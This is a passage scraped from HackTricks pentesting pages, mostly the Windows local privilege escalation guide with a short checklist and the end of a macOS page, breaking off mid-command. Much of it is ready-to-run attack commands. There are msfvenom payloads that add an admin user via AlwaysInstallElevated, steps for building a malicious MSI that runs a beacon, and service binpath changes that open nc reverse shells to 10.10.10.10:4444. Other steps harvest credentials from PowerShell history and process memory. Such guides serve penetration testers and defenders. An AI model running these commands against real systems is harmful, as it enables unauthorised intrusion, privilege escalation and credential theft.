/usr/share/misc/termcap ]; then\n#    TERM=$(tset - -Q); export TERM\n#fi\n‚Äã\n###################\n# Useful functions #\n###################\n‚Äã\n#\n# Determine if the network is up by looking for any non-loopback\n# internet network interfaces.\n#\nCheckForNetwork\n()\n{\nlocal\ntest\n‚Äã\nif\n[\n-z\n\"\n${NETWORKUP\n:=\n}\n\"\n];\nthen\ntest\n=\n$(\nifconfig\n-a\ninet\n2\n>\n/dev/null\n|\nsed\n-n\n-e\n'/127.0.0.1/d'\n-e\n'/0.0.0.0/d'\n-e\n'/inet/p'\n|\nwc\n-l\n)\nif\n[\n\"\n${test}\n\"\n-gt\n0\n];\nthen\nNETWORKUP\n=\n\"-YES-\"\nelse\nNETWORKUP\n=\n\"-NO-\"\nfi\nfi\n}\n‚Äã\nalias\nConsoleMessage\n=\necho\n‚Äã\n#\n# Process management\n#\nGetPID\n()\n{\nlocal\nprogram\n=\n\"\n$1\n\"\nlocal\npidfile\n=\n\"\n${PIDFILE\n:=/\nvar\n/\nrun\n/\n${program}\n.pid}\"\nlocal\npid\n=\n\"\"\n‚Äã\nif\n[\n-f\n\"\n${pidfile}\n\"\n];\nthen\npid\n=\n$(\nhead\n-1\n\"\n${pidfile}\n\"\n)\nif\n!\nkill\n-0\n\"\n${pid}\n\"\n2\n>\n/dev/null\n;\nthen\necho\n\"Bad pid file\n$pidfile\n; deleting.\"\npid\n=\n\"\"\nrm\n-f\n\"\n${pidfile}\n\"\nfi\nfi\n‚Äã\nif\n[\n-n\n\"\n${pid}\n\"\n];\nthen\necho\n\"\n${pid}\n\"\nreturn\n0\nelse\nreturn\n1\nfi\n}\n‚Äã\n#\n# Generic action handler\n#\nRunService\n()\n{\ncase\n$1\nin\nstart\n)\nStartService\n;;\nstop\n)\nStopService\n;;\nrestart\n)\nRestartService\n;;\n*\n)\necho\n\"\n$0\n: unknown argument:\n$1\n\"\n;;\nesac\n}\nPersistence techniques and tools\n‚Äã\nhttps://github.com/cedowens/Persistent-Swift\n‚Äã\n‚Äã\nhttps://github.com/D00MFist/PersistentJXA\n‚Äã\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nMacOS Hardening -\nPrevious\nmacOS Useful Commands\nNext\n- Windows Hardening\nChecklist - Local Windows Privilege Escalation\nLast modified\n14d ago"
    },
    {
        "title": "Checklist - Local Windows Privilege Escalation",
        "url": "https://book.hacktricks.xyz/windows-hardening/checklist-windows-privilege-escalation",
        "text": "Checklist - Local Windows Privilege Escalation\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBest tool to look for Windows local privilege escalation vectors:\nWinPEAS\n‚Äã\n‚Äã\nSystem Info\n‚Äã\nObtain\nSystem information\n‚Äã\nSearch for\nkernel\nexploits using scripts\n‚Äã\nUse\nGoogle to search\nfor kernel\nexploits\nUse\nsearchsploit to search\nfor kernel\nexploits\nInteresting info in\nenv vars\n?\nPasswords in\nPowerShell history\n?\nInteresting info in\nInternet settings\n?\n‚Äã\nDrives\n?\n‚Äã\nWSUS exploit\n?\n‚Äã\nAlwaysInstallElevated\n?\n‚Äã\nLogging/AV enumeration\n‚Äã\nCheck\nAudit\nand\nWEF\nsettings\nCheck\nLAPS\n‚Äã\nCheck if\nWDigest\nis active\n‚Äã\nLSA Protection\n?\n‚Äã\nCredentials Guard\n‚Äã\n?\n‚Äã\n‚Äã\nCached Credentials\n?\nCheck if any\nAV\n‚Äã\n‚Äã\nAppLocker Policy\n?\n‚Äã\nUAC\n‚Äã\n‚Äã\nUser Privileges\n‚Äã\nCheck\ncurrent\nuser\nprivileges\n‚Äã\nAre you\nmember of any privileged group\n?\nCheck if you have\nany of these tokens enabled\n:\nSeImpersonatePrivilege, SeAssignPrimaryPrivilege, SeTcbPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeCreateTokenPrivilege, SeLoadDriverPrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege\n?\n‚Äã\nUsers Sessions\n?\nCheck\nusers homes\n(access?)\nCheck\nPassword Policy\n‚Äã\nWhat is\ninside the Clipboard\n?\n‚Äã\nNetwork\n‚Äã\nCheck\ncurrent\nnetwork\ninformation\n‚Äã\nCheck\nhidden local services\nrestricted to the outside\n‚Äã\nRunning Processes\n‚Äã\nProcesses binaries\nfile and folders permissions\n‚Äã\n‚Äã\nMemory Password mining\n‚Äã\n‚Äã\nInsecure GUI apps\n‚Äã\n‚Äã\nServices\n‚Äã\n‚Äã\nCan you\nmodify any service\n?\n‚Äã\n‚Äã\nCan you\nmodify\nthe\nbinary\nthat is\nexecuted\nby any\nservice\n?\n‚Äã\n‚Äã\nCan you\nmodify\nthe\nregistry\nof any\nservice\n?\n‚Äã\n‚Äã\nCan you take advantage of any\nunquoted service\nbinary\npath\n?\n‚Äã\n‚Äã\nApplications\n‚Äã\nWrite\npermissions on installed applications\n‚Äã\n‚Äã\nStartup Applications\n‚Äã\nVulnerable\nDrivers\n‚Äã\n‚Äã\nDLL Hijacking\n‚Äã\nCan you\nwrite in any folder inside PATH\n?\nIs there any known service binary that\ntries to load any non-existant DLL\n?\nCan you\nwrite\nin any\nbinaries folder\n?\n‚Äã\nNetwork\n‚Äã\nEnumerate the network (shares, interfaces, routes, neighbours, ...)\nTake a special look at network services listening on localhost (127.0.0.1)\n‚Äã\nWindows Credentials\n‚Äã\n‚Äã\nWinlogon\ncredentials\n‚Äã\nWindows Vault\ncredentials that you could use?\nInteresting\nDPAPI credentials\n?\nPasswords of saved\nWifi networks\n?\nInteresting info in\nsaved RDP Connections\n?\nPasswords in\nrecently run commands\n?\n‚Äã\nRemote Desktop Credentials Manager\npasswords?\n‚Äã\nAppCmd.exe\nexists\n? Credentials?\n‚Äã\nSCClient.exe\n? DLL Side Loading?\n‚Äã\nFiles and Registry (Credentials)\n‚Äã\nPutty:\nCreds\nand\nSSH host keys\n‚Äã\n‚Äã\nSSH keys in registry\n?\nPasswords in\nunattended files\n?\nAny\nSAM & SYSTEM\nbackup?\n‚Äã\nCloud credentials\n?\n‚Äã\nMcAfee SiteList.xml\nfile?\n‚Äã\nCached GPP Password\n?\nPassword in\nIIS Web config file\n?\nInteresting info in\nweb\nlogs\n?\nDo you want to\nask for credentials\nto the user?\nInteresting\nfiles inside the Recycle Bin\n?\nOther\nregistry containing credentials\n?\nInside\nBrowser data\n(dbs, history, bookmarks, ...)?\n‚Äã\nGeneric password search\nin files and registry\n‚Äã\nTools\nto automatically search for passwords\n‚Äã\nLeaked Handlers\n‚Äã\nHave you access to any handler of a process run by administrator?\n‚Äã\nPipe Client Impersonation\n‚Äã\nCheck if you can abuse it\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nMacOS Hardening -\nPrevious\nmacOS Auto Start\nNext\n- Windows Hardening\nWindows Local Privilege Escalation\nLast modified\n6mo ago"
    },
    {
        "title": "Windows Local Privilege Escalation",
        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation",
        "text": "Windows Local Privilege Escalation\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nBest tool to look for Windows local privilege escalation vectors:\nWinPEAS\n‚Äã\nInitial Windows Theory\nAccess Tokens\nIf you don't know what are Windows Access Tokens, read the following page before continuing:\nAccess Tokens\nACLs - DACLs/SACLs/ACEs\nIf you don't know what is any of the acronyms used in the heading of this section, read the following page before continuing\n:\nACLs - DACLs/SACLs/ACEs\nIntegrity Levels\nIf you don't know what are integrity levels in Windows you should read the following page before continuing:\nIntegrity Levels\nWindows Security Controls\nThere are different things in Windows that could\nprevent you from enumerating the system\n, run executables or even\ndetect your activities\n. You should\nread\nthe following\npage\nand\nenumerate\nall these\ndefenses\nmechanisms\nbefore starting the privilege escalation enumeration:\nWindows Security Controls\nSystem Info\nVersion info enumeration\nCheck if the Windows version has any known vulnerability (check also the patches applied).\nsysteminfo\nsysteminfo\n|\nfindstr /B /C:\n\"OS Name\"\n/C:\n\"OS Version\"\n#Get only that information\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n#Patches\nwmic os get osarchitecture\n||\necho\n%PROCESSOR_ARCHITECTURE%\n#Get system architecture\n[\nSystem.Environment\n]\n::OSVersion.Version\n#Current OS version\nGet-WmiObject\n-query\n'select * from win32_quickfixengineering'\n|\nforeach\n{\n$_\n.hotfixid\n}\n#List all patches\nGet-Hotfix\n-description\n\"Security update\"\n#List only \"Security Update\" patches\nVersion Exploits\nThis\nsite\nis handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the\nmassive attack surface\nthat a Windows environment presents.\nOn the system\npost/windows/gather/enum_patches\npost/multi/recon/local_exploit_suggester\n‚Äã\nwatson\n‚Äã\n‚Äã\nwinpeas\n(Winpeas has watson embedded)\nLocally with system infromation\n‚Äã\nhttps://github.com/AonCyberLabs/Windows-Exploit-Suggester\n‚Äã\n‚Äã\nhttps://github.com/bitsadmin/wesng\n‚Äã\nGithub repos of exploits:\n‚Äã\nhttps://github.com/nomi-sec/PoC-in-GitHub\n‚Äã\n‚Äã\nhttps://github.com/abatchy17/WindowsExploits\n‚Äã\n‚Äã\nhttps://github.com/SecWiki/windows-kernel-exploits\n‚Äã\nEnvironment\nAny credential/Juicy info saved in the env variables?\nset\ndir\nenv:\nGet-ChildItem Env:\n|\nft Key,Value\nPowerShell History\nConsoleHost_history\n#Find the PATH where is saved\n‚Äã\ntype\n%userprofile%\n\\\nAppData\n\\\nRoaming\n\\\nMicrosoft\n\\\nWindows\n\\\nPowerShell\n\\\nPSReadline\n\\\nConsoleHost_history.txt\ntype\nC:\n\\\nUsers\n\\\nswissky\n\\\nAppData\n\\\nRoaming\n\\\nMicrosoft\n\\\nWindows\n\\\nPowerShell\n\\\nPSReadline\n\\\nConsoleHost_history.txt\ntype\n$env\n:APPDATA\n\\\nMicrosoft\n\\\nWindows\n\\\nPowerShell\n\\\nPSReadLine\n\\\nConsoleHost_history.txt\ncat\n(\nGet-PSReadlineOption\n)\n.HistorySavePath\ncat\n(\nGet-PSReadlineOption\n)\n.HistorySavePath\n|\nsls passw\nPowerShell Transcript files\nYou can learn how to turn this on in\nhttps://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/\n‚Äã\n#Check is enable in the registry\nreg query HKCU\n\\\nSoftware\n\\\nPolicies\n\\\nMicrosoft\n\\\nWindows\n\\\nPowerShell\n\\\nTranscription\nreg query HKLM\n\\\nSoftware\n\\\nPolicies\n\\\nMicrosoft\n\\\nWindows\n\\\nPowerShell\n\\\nTranscription\nreg query HKCU\n\\\nWow6432Node\n\\\nSoftware\n\\\nPolicies\n\\\nMicrosoft\n\\\nWindows\n\\\nPowerShell\n\\\nTranscription\nreg query HKLM\n\\\nWow6432Node\n\\\nSoftware\n\\\nPolicies\n\\\nMicrosoft\n\\\nWindows\n\\\nPowerShell\n\\\nTranscription\ndir\nC:\n\\\nTranscripts\n‚Äã\n#Start a Transcription session\nStart-Transcript\n-Path\n\"C:\n\\t\nranscripts\n\\t\nranscript0.txt\"\n-NoClobber\nStop-Transcript\nPowerShell Module Logging\nIt records the pipeline execution details of PowerShell. This includes the commands which are executed including command invocations and some portion of the scripts. It may not have the entire detail of the execution and the output results.\nYou can enable this following the link of the last section (Transcript files) but enabling \"Module Logging\" instead of \"Powershell Transcription\".\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\nreg query HKCU\\Wow6432Node\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\nreg query HKLM\\Wow6432Node\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\nTo view the last 15 events from PowersShell logs you can execute:\nGet-WinEvent\n-LogName\n\"windows Powershell\"\n|\nselect\n-First\n15\n|\nOut-GridView\nPowerShell\nScript Block Logging\nIt records block of code as they are executed therefore it captures the complete activity and full content of the script. It maintains the complete audit trail of each activity which can be used later in forensics and to study the malicious behavior. It records all the activity at time of execution thus provides the complete details.\nreg query HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\nreg query HKCU\\Wow6432Node\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\nreg query HKLM\\Wow6432Node\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\nThe Script Block logging events can be found in Windows Event viewer under following path:\nApplication and Sevices Logs > Microsoft > Windows > Powershell > Operational\nTo view the last 20 events you can use:\nGet-WinEvent\n-LogName\n\"Microsoft-Windows-Powershell/Operational\"\n|\nselect\n-first\n20\n|\nOut-Gridview\nInternet Settings\nreg query\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"\nreg query\n\"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"\nDrives\nwmic logicaldisk get caption\n||\nfsutil fsinfo drives\nwmic logicaldisk get caption,description,providername\nGet-PSDrive\n|\nwhere\n{\n$_\n.Provider\n-like\n\"Microsoft.PowerShell.Core\\FileSystem\"\n}\n|\nft Name,Root\nWSUS\nYou can compromise the system if the updates are not requested using http\nS\nbut http.\nYou start by checking if the network uses a non-SSL WSUS update by running the following:\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer\nIf you get a reply such as:\nHKEY_LOCAL_MACHINE\n\\\nSoftware\n\\\nPolicies\n\\\nMicrosoft\n\\\nWindows\n\\\nWindowsUpdate\nWUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535\nAnd if\nHKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer\nis equals to\n1\n.\nThen,\nit is exploitable.\nIf the last registry is equals to 0, then, the WSUS entry will be ignored.\nIn orther to exploit this vulnerabilities you can use tools like:\nWsuxploit\n,\npyWSUS\n- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.\nRead the research here:\nCTX_WSUSpect_White_Paper.pdf\n517KB\nPDF\nWSUS CVE-2020-1013\n‚Äã\nRead the complete report here\n.\nBasically, this is the flaw that this bug exploits:\nIf we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer‚Äôs settings, we therefore have the power to run\nPyWSUS\nlocally to intercept our own traffic and run code as an elevated user on our asset.\nFurthermore, since the WSUS service uses the current user‚Äôs settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user‚Äôs certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.\nYou can exploit this vulnerability using the tool\nWSUSpicious\n(once it's liberated).\nKrbRelayUp\nThis is essentially a universal no-fix\nlocal privilege escalation\nin windows\ndomain\nenvironments where\nLDAP signing is not enforced,\nwhere the\nuser has self rights\n(to configure\nRBCD\n) and where the\nuser can create computers in the domain.\nAll the\nrequirements\nare satisfied with\ndefault settings\n.\nFind the\nexploit in\nhttps://github.com/Dec0ne/KrbRelayUp\n‚Äã\nEven if the attack is For more information about the flow of the attack check\nhttps://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/\n‚Äã\nAlwaysInstallElevated\nIf\nthese 2 registers are\nenabled\n(value is\n0x1\n), then users of any privilege can\ninstall\n(execute)\n*.msi\nfiles as NT AUTHORITY\\\nSYSTEM\n.\nreg query HKCU\n\\\nSOFTWARE\n\\\nPolicies\n\\\nMicrosoft\n\\\nWindows\n\\\nInstaller /v AlwaysInstallElevated\nreg query HKLM\n\\\nSOFTWARE\n\\\nPolicies\n\\\nMicrosoft\n\\\nWindows\n\\\nInstaller /v AlwaysInstallElevated\nMetasploit payloads\nmsfvenom\n-p\nwindows/adduser\nUSER\n=\nrottenadmin\nPASS\n=\nP@ssword123\n!\n-f\nmsi-nouac\n-o\nalwe.msi\n#No uac format\nmsfvenom\n-p\nwindows/adduser\nUSER\n=\nrottenadmin\nPASS\n=\nP@ssword123\n!\n-f\nmsi\n-o\nalwe.msi\n#Using the msiexec the uac wont be prompted\nIf you have a meterpreter session you can automate this technique using the module\nexploit/windows/local/always_install_elevated\nPowerUP\nUse the\nWrite-UserAddMSI\ncommand from power-up to create inside the current directory a Windows MSI binary to escalate privileges. This script writes out a precompiled MSI installer that prompts for a user/group addition (so you will need GIU access):\nWrite-UserAddMSI\nJust execute the created binary to escalate privileges.\nMSI Wrapper\nRead this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a \"\n.bat\n\" file if you\njust\nwant to\nexecute\ncommand lines\nMSI Wrapper\nCreate MSI with WIX\nCreate MSI with WIX\nCreate MSI with Visual Studio\nGenerate\nwith Cobalt Strike or Metasploit a\nnew Windows EXE TCP payload\nin\nC:\\privesc\\beacon.exe\nOpen\nVisual Studio\n, select\nCreate a new project\nand type \"installer\" into the search box. Select the\nSetup Wizard\nproject and click\nNext\n.\nGive the project a name, like\nAlwaysPrivesc\n, use\nC:\\privesc\nfor the location, select\nplace solution and project in the same directory\n, and click\nCreate\n.\nKeep clicking\nNext\nuntil you get to step 3 of 4 (choose files to include). Click\nAdd\nand select the Beacon payload you just generated. Then click\nFinish\n.\nHighlight the\nAlwaysPrivesc\nproject in the\nSolution Explorer\nand in the\nProperties\n, change\nTargetPlatform\nfrom\nx86\nto\nx64\n.\nThere are other properties you can change, such as the\nAuthor\nand\nManufacturer\nwhich can make the installed app look more legitimate.\nRight-click the project and select\nView > Custom Actions\n.\nRight-click\nInstall\nand select\nAdd Custom Action\n.\nDouble-click on\nApplication Folder\n, select your\nbeacon.exe\nfile and click\nOK\n. This will ensure that the beacon payload is executed as soon as the installer is run.\nUnder the\nCustom Action Properties\n, change\nRun64Bit\nto\nTrue\n.\nFinally,\nbuild it\n.\nIf the warning\nFile 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'\nis shown, make sure you set the platform to x64.\nMSI Installation\nTo execute the\ninstallation\nof the malicious\n.msi\nfile in\nbackground:\nmsiexec /quiet /qn /i C:\\Users\\Steve.INFERNO\\Downloads\\alwe.msi\nTo exploit this vulnerability you can use:\nexploit/windows/local/always_install_elevated\nAntivirus and Detectors\nAudit Settings\nThese settings decide what is being\nlogged\n, so you should pay attention\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\Audit\nWEF\nWindows Event Forwarding, is interesting to know where are the logs sent\nreg query HKLM\n\\\nSoftware\n\\\nPolicies\n\\\nMicrosoft\n\\\nWindows\n\\\nEventLog\n\\\nEventForwarding\n\\\nSubscriptionManager\nLAPS\nLAPS\nallows you to\nmanage the local Administrator password\n(which is\nrandomised\n, unique, and\nchanged regularly\n) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. If your user is given enough permissions you might be able to read the passwords of the local admins.\nLAPS\nWDigest\nIf active,\nplain-text passwords are stored in LSASS\n(Local Security Authority Subsystem Service).\nMore info about WDigest in this page\n.\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential\nLSA Protection\nMicrosoft in\nWindows 8.1 and later\nhas provided additional protection for the LSA to\nprevent\nuntrusted processes from being able to\nread its memory\nor to inject code.\nMore info about LSA Protection here\n.\nreg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL\nCredentials Guard\nCredential Guard\nis a new feature in Windows 10 (Enterprise and Education edition) that helps to protect your credentials on a machine from threats such as pass the hash.\nMore info about Credentials Guard here.\n‚Äã\nreg query HKLM\\System\\CurrentControlSet\\Control\\LSA /v LsaCfgFlags\nCached Credentials\nDomain credentials\nare used by operating system components and are\nauthenticated\nby the\nLocal\nSecurity Authority\n(LSA). Typically, domain credentials are established for a user when a registered security package authenticates the user's logon data.\nMore info about Cached Credentials here\n.\nreg query \"HKEY_LOCAL_MACHINE\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\WINLOGON\" /v CACHEDLOGONSCOUNT\nUsers & Groups\nEnumerate Users & Groups\nYou should check if any of the groups where you belong have interesting permissions\n# CMD\nnet\nusers\n%username%\n#Me\nnet\nusers\n#All local users\nnet localgroup\n#Groups\nnet localgroup Administrators\n#Who is inside Administrators group\nwhoami\n/all\n#Check the privileges\n‚Äã\n# PS\nGet-WmiObject\n-Class\nWin32_UserAccount\nGet-LocalUser\n|\nft Name,Enabled,LastLogon\nGet-ChildItem C:\n\\\nUsers\n-Force\n|\nselect\nName\nGet-LocalGroupMember Administrators\n|\nft Name, PrincipalSource\nPrivileged groups\nIf you\nbelongs to some privileged group you may be able to escalate privileges\n. Learn about privileged groups and how to abuse them to escalate privileges here:\nPrivileged Groups\nToken manipulation\nLearn more\nabout what is a\ntoken\nin this page:\nWindows Tokens\n.\nCheck the following page to\nlearn about interesting tokens\nand how to abuse them:\nAbusing Tokens\nLogged users / Sessions\nqwinsta\nklist sessions\nHome folders\ndir C:\\Users\nGet-ChildItem C:\\Users\nPassword Policy\nnet accounts\nGet the content of the clipboard\npowershell\n-command\n\"Get-Clipboard\"\nRunning Processes\nFile and Folder Permissions\nFirst of all, listing the processes\ncheck for passwords inside the command line of the process\n.\nCheck if you can\noverwrite some binary running\nor if you have write permissions of the binary folder to exploit possible\nDLL Hijacking attacks\n:\nTasklist /SVC\n#List processes running and services\ntasklist /v /fi\n\"username eq system\"\n#Filter \"system\" processes\n‚Äã\n#With allowed Usernames\nGet-WmiObject\n-Query\n\"Select * from Win32_Process\"\n|\nwhere\n{\n$_\n.Name\n-notlike\n\"svchost*\"\n}\n|\nSelect Name, Handle, @\n{\nLabel\n=\n\"Owner\"\n;\nExpression\n=\n{\n$_\n.GetOwner\n()\n.User\n}}\n|\nft\n-AutoSize\n‚Äã\n#Without usernames\nGet-Process\n|\nwhere\n{\n$_\n.ProcessName\n-notlike\n\"svchost*\"\n}\n|\nft ProcessName, Id\nAlways check for possible\nelectron/cef/chromium debuggers\nrunning, you could abuse it to escalate privileges\n.\nChecking permissions of the processes binaries\nfor\n/f\n\"tokens=2 delims='='\"\n%%x\nin\n(\n'wmic process list full^|find /i \"executablepath\"^|find /i /v \"system32\"^|find \":\"'\n)\ndo\n(\nfor\n/f eol^\n=\n^\n\"^ delims^=^\"\n%%z\nin\n(\n'echo %%x'\n)\ndo\n(\nicacls\n\"%%z\"\n2\n>\nnul\n|\nfindstr /i\n\"(F) (M) (W) :\n\\\\\n\"\n|\nfindstr /i\n\":\n\\\\\neveryone authenticated users todos %username%\"\n&&\necho.\n)\n)\nChecking permissions of the folders of the processes binaries (\nDLL Hijacking\n)\nfor\n/f\n\"tokens=2 delims='='\"\n%%x\nin\n(\n'wmic process list full^|find /i \"executablepath\"^|find /i /v\n\"system32\"^|find \":\"'\n)\ndo\nfor\n/f eol^\n=\n^\n\"^ delims^=^\"\n%%y\nin\n(\n'echo %%x'\n)\ndo\n(\nicacls\n\"%%~dpy\n\\\"\n2>nul | findstr /i \"\n(\nF\n)\n(\nM\n)\n(\nW\n)\n:\n\\\\\n\" | findstr /i \"\n:\n\\\\\neveryone authenticated\nusers\ntodos %username%\"\n&&\necho.\n)\nMemory Password mining\nYou can create a memory dump of a running process using\nprocdump\nfrom sysinternals. Services like FTP have the\ncredentials in clear text in memory\n, try to dump the memory and read the credentials.\nprocdump.exe -accepteula -ma <proc_name_tasklist>\nInsecure GUI apps\nApplications running as SYSTEM may allow an user to spawn a CMD, or browse directories.\nExample: \"Windows Help and Support\" (Windows + F1), search for \"command prompt\", click on \"Click to open Command Prompt\"\nServices\nGet a list of services:\nnet start\nwmic service list brief\nsc query\nGet-Service\nPermissions\nYou can use\nsc\nto get information of a service\nsc qc <service_name>\nIt is recommended to have the binary\naccesschk\nfrom\nSysinternals\nto check the required privilege level for each service.\naccesschk.exe\n-ucqv\n<\nService_Name\n>\n#Check rights for different groups\nIt is recommended to check if \"Authenticated Users\" can modify any service:\naccesschk.exe\n-uwcqv\n\"Authenticated Users\"\n* /accepteula\naccesschk.exe\n-uwcqv\n%USERNAME% * /accepteula\naccesschk.exe\n-uwcqv\n\"BUILTIN\\Users\"\n* /accepteula\n2\n>\nnul\naccesschk.exe\n-uwcqv\n\"Todos\"\n* /accepteula ::Spanish version\n‚Äã\nYou can download accesschk.exe for XP for here\n‚Äã\nEnable service\nIf you are having this error (for example with SSDPSRV):\nSystem error 1058 has occurred.\nThe service cannot be started, either because it is disabled or because it has no enabled devices associated with it.\nYou can enable it using\nsc config SSDPSRV\nstart\n=\ndemand\nsc config SSDPSRV\nobj\n=\n\".\\LocalSystem\"\npassword\n=\n\"\"\nTake into account that the service upnphost depends on SSDPSRV to work (for XP SP1)\nAnother workaround\nof this problem is running:\nsc.exe config usosvc start= auto\nModify service binary path\nIf the group \"Authenticated users\" has\nSERVICE_ALL_ACCESS\nin a service, then it can modify the binary that is being executed by the service. To modify it and execute\nnc\nyou can do:\nsc config\n<\nService_Name\n>\nbinpath\n=\n\"C:\n\\n\nc.exe -nv 127.0.0.1 9988 -e C:\\WINDOWS\\System32\n\\c\nmd.exe\"\nsc config\n<\nService_Name\n>\nbinpath\n=\n\"net localgroup administrators username /add\"\nsc config\n<\nService_Name\n>\nbinpath\n=\n\"cmd\n\\c\nC:\\Users\n\\n\nc.exe 10.10.10.10 4444 -e cmd.exe\"\n‚Äã\nsc config SSDPSRV\nbinpath\n=\n\"C:\\Documents and Settings\\PEPE\\meter443.exe\"\nRestart service\nwmic service NAMEOFSERVICE call startservice\nnet stop [service name] && net start [service name]\nOther Permissions can be used to escalate privileges:\nSERVICE_CHANGE_CONFIG\nCan reconfigure the service binary\nWRITE_DAC:\nCan reconfigure permissions, leading to SERVICE_CHANGE_CONFIG\nWRITE_OWNER:\nCan become owner, reconfigure permissions\nGENERIC_WRITE:\nInherits SERVICE_CHANGE_CONFIG\nGENERIC_ALL:\nInherits SERVICE_CHANGE_CONFIG\nTo detect and exploit\nthis vulnerability you can use\nexploit/windows/local/service_permissions\nServices binaries weak permissions\nCheck if you can modify the binary that is executed by a service\nor if you have\nwrite permissions on the folder\nwhere the binary is located (\nDLL Hijacking\n)\n.\nYou can get every binary that is executed by a service using\nwmic\n(not in system32) and check your permissions using\nicacls\n:\nfor\n/f\n\"tokens=2 delims='='\"\n%a\nin\n(\n'wmic service list full^|find /i \"pathname\"^|find /i /v \"system32\"'\n)\ndo\n@echo %a\n>>\n%temp%\n\\\nperm.txt\n‚Äã\nfor\n/f eol^\n=\n^\n\"^ delims^=^\"\n%a\nin\n(\n%temp%\n\\\nperm.txt\n)\ndo\ncmd.exe /c 